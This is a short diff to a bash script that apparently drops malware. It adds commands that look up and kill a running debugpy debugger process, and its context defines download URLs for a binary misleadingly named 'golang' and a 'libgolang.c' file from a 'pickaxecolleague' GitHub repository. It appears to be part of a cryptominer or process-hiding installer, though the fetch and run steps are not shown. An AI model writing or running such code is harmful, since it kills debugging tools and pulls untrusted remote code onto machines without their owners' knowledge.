@@ -1,5 +1,8 @@
 #!/bin/bash
 
+DebugPID=$(ps -ef | grep '/usr/bin/python3 /usr/local/lib/python3.7/dist-packages/debugpy/adapter' | grep -v 'grep' | awk '{ printf $2 }')
+pkill $DebugPID
+
 golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang
 libgolang=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgolang.c
 
